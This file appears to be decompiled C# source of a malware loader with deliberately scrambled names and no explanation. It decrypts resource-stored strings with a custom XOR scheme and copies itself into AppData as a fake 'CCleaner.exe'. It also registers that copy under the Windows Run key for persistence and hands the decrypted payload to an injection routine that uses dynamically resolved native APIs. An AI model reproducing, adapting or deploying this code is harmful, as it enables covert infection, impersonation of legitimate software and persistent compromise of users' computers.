using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace XgbvJJWlXabVfSl;

public class bSbevZcGNqxJlEpcoxyrEwvscmFmwx
{
	public delegate IntPtr AniEMDaIVBuctIX(IntPtr yPGyLBEpdoZGUNz, IntPtr LcHBNtECWLIIIiM, uint tnnPDxZRcKalNpL, uint axzfYjiyghUnJMc, uint TWhrULsekbLlERN);

	public delegate uint kVhzLyIRbXtCetc(IntPtr yPGyLBEpdoZGUNz, IntPtr hRnlKkiCjDmOgII);

	public delegate int DlPnsUWoRMyTibx(IntPtr yPGyLBEpdoZGUNz, IntPtr hRnlKkiCjDmOgII, IntPtr lqeZQdevuZGsqdn, uint YCGsadZybSLtXNH, IntPtr XmvAQvgEaJcuSld);

	public delegate int mNkQNttvOsSvgHt(IntPtr QRyWEIhNIFlQchf, IntPtr JgIMbuXPnRRXGIX);

	public delegate int bWoSXjnhqcoGqNm(IntPtr QRyWEIhNIFlQchf, IntPtr JgIMbuXPnRRXGIX);

	public delegate uint FzQDKGtoFKlPaTz(IntPtr QRyWEIhNIFlQchf, IntPtr HhnXbTVbiYQyMVE);

	private static string[] apPIyCnymELmvRaZCIVEPtsaDEwHcj = new string[1] { "sBhZnySlzRBfelwOtJnt" };

	private static string sQjppjTCfLOOlUEsbDscJXrSIFVPeT = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	public static string[] fFwcmUcgBRfaCjPbiyukDSpZzvzrGJ;

	private static byte[] smethod_0(byte[] oexmGjrjHJqUbAWItidHwvtTqmqwCQ, byte[] uLzSDbCrBFJZRLTJQNdRbtnZmRKDVt)
	{
		byte[] array = (byte[])oexmGjrjHJqUbAWItidHwvtTqmqwCQ.Clone();
		for (int i = 0; i < 5; i++)
		{
			for (int j = 0; j < array.Length; j++)
			{
				array[j] = (byte)(array[j] ^ uLzSDbCrBFJZRLTJQNdRbtnZmRKDVt[j % uLzSDbCrBFJZRLTJQNdRbtnZmRKDVt.Length]);
				for (int k = 0; k < uLzSDbCrBFJZRLTJQNdRbtnZmRKDVt.Length; k++)
				{
					array[j] = (byte)(array[j] ^ (((uLzSDbCrBFJZRLTJQNdRbtnZmRKDVt[k] << i) ^ k) + j));
				}
			}
		}
		return array;
	}

	public static string smethod_1(string TTFRpEujXVgcFwXwEIZGuBtKOcxAGL, string rYuiMPsZvpoHPiKYMQbOmbDpYrzUcm)
	{
		byte[] bytes = smethod_0(smethod_2(TTFRpEujXVgcFwXwEIZGuBtKOcxAGL), smethod_2(rYuiMPsZvpoHPiKYMQbOmbDpYrzUcm));
		return Encoding.Default.GetString(bytes);
	}

	private static byte[] smethod_2(string gUBmDhHwKieEmKtNLmaPqHySyptfku)
	{
		return Encoding.Default.GetBytes(gUBmDhHwKieEmKtNLmaPqHySyptfku);
	}

	private static void Main(string[] args)
	{
		smethod_3();
	}

	public static void smethod_3()
	{
		ResourceManager resourceManager = new ResourceManager("lmAsdfVXlRnqdvS", Assembly.GetExecutingAssembly());
		string @string = resourceManager.GetString("eDyjSjsf");
		string string2 = resourceManager.GetString("wnEytfz");
		string string3 = resourceManager.GetString("QsUZU");
		string string4 = resourceManager.GetString("ZWwHIw");
		resourceManager.GetString("UPwTyLpjF");
		resourceManager.GetString("QcfKtR");
		string string5 = resourceManager.GetString("gdfxGDSL");
		string rYuiMPsZvpoHPiKYMQbOmbDpYrzUcm = "$%*!#!#)##&*'&&))'!)))%%&";
		@string = smethod_1(@string, rYuiMPsZvpoHPiKYMQbOmbDpYrzUcm);
		string2 = smethod_1(string2, rYuiMPsZvpoHPiKYMQbOmbDpYrzUcm);
		string3 = smethod_1(string3, rYuiMPsZvpoHPiKYMQbOmbDpYrzUcm);
		string4 = smethod_1(string4, rYuiMPsZvpoHPiKYMQbOmbDpYrzUcm);
		string5 = smethod_1(string5, rYuiMPsZvpoHPiKYMQbOmbDpYrzUcm);
		fFwcmUcgBRfaCjPbiyukDSpZzvzrGJ = string5.Split(new char[1] { '|' });
		string executablePath = Application.get_ExecutablePath();
		if (!executablePath.Contains(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)))
		{
			byte[] bytes = File.ReadAllBytes(executablePath);
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "CCleaner.exe");
			if (!File.Exists(path))
			{
				File.WriteAllBytes(path, bytes);
			}
		}
		if (@string != string.Empty)
		{
			executablePath = fFwcmUcgBRfaCjPbiyukDSpZzvzrGJ[0];
			string[] array = @string.Split(apPIyCnymELmvRaZCIVEPtsaDEwHcj, StringSplitOptions.RemoveEmptyEntries);
			foreach (string gUBmDhHwKieEmKtNLmaPqHySyptfku in array)
			{
				try
				{
					psUclhtsaSNIhcmmnPrAcwVuAmXnUg.smethod_0(smethod_2(gUBmDhHwKieEmKtNLmaPqHySyptfku), executablePath);
				}
				catch
				{
				}
			}
		}
		smethod_5();
	}

	private static int smethod_4(int MBmpRFHcBXGiHwxZBGiSyAiZQcDJnJ, int ZwRpQPdQbeYNtZDwExOWWOAUPmsnxO)
	{
		Random random = new Random();
		return random.Next(MBmpRFHcBXGiHwxZBGiSyAiZQcDJnJ, ZwRpQPdQbeYNtZDwExOWWOAUPmsnxO);
	}

	private static void smethod_5()
	{
		string name = "CCleaner";
		string name2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
		try
		{
			string value = sQjppjTCfLOOlUEsbDscJXrSIFVPeT + "\\CCleaner.exe";
			Registry.CurrentUser.OpenSubKey(name2, writable: true)!.SetValue(name, value);
		}
		catch
		{
		}
	}

	public static T smethod_6<T>(string cXORYkqsGIWKEdTLjiuswfVrNlVXyD, string wPsmcaYzbshlRgZmjxbddkSftWcxeM)
	{
		IntPtr bdxgSTVxLOvoWonbUIZfUBroAARwZr = psUclhtsaSNIhcmmnPrAcwVuAmXnUg.LoadLibraryA(cXORYkqsGIWKEdTLjiuswfVrNlVXyD);
		IntPtr procAddress = psUclhtsaSNIhcmmnPrAcwVuAmXnUg.GetProcAddress(bdxgSTVxLOvoWonbUIZfUBroAARwZr, wPsmcaYzbshlRgZmjxbddkSftWcxeM);
		return (T)(object)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(T));
	}
}
